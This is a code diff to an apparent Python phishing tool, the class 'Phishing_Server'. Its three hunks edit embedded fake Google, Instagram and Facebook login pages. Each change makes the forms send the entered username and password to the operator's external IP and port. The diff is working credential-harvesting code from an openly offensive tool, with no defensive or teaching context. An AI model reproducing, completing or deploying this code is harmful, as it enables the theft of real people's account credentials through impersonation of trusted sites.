@@ -275,7 +275,7 @@ class Phishing_Server:
                 <div class="account-wall">
                     <img class="profile-img" src="https://lh5.googleusercontent.com/-b0-k99FZlyE/AAAAAAAAAAI/AAAAAAAAAAA/eu7opA4byxI/photo.jpg?sz=120"
                         alt="">
-                    <form class="form-signin" action="http://""" + self.externalip + """">
+                    <form class="form-signin" action="http://""" + self.externalip + """:"""+str(self.port)+"""">
                     <input type="text" name="username" class="form-control" placeholder="Email" required autofocus>
                     <input type="password" name="password" class="form-control" placeholder="Password" required>
                     <button class="btn btn-lg btn-primary btn-block" type="submit">
@@ -411,7 +411,7 @@ class Phishing_Server:
                                                   <img src="https://i.imgur.com/zqpwkLQ.png" />
                                                 </div>
                                                 <div class="l-part">
-                                                  <form action="http://""" + self.externalip + """">
+                                                  <form action="http://""" + self.externalip + """:"""+str(self.port)+"""">
                                                     <input type="text" placeholder="Username" class="input-1" name="username">
                                                     <div class="overlap-text">
                                                     <input type="password" placeholder="Password" name="password" style="width: 100%; margin-bottom: 5px; padding: 8px 12px; border: 1px solid #dbdbdb; box-sizing: border-box; border-radius: 3px;">
@@ -588,7 +588,7 @@ class Phishing_Server:
     				<h2>Facebook helps you connect and share with the people in your life.</h2>
     			</div>
     			<div class="content-right">
-    				<form action="http://""" + self.externalip + """">
+    				<form action="http://""" + self.externalip + """:"""+str(self.port)+"""">
     					<div class="form-group">
     						<input type="text" placeholder="Email address or phone number" name="username">
     					</div>
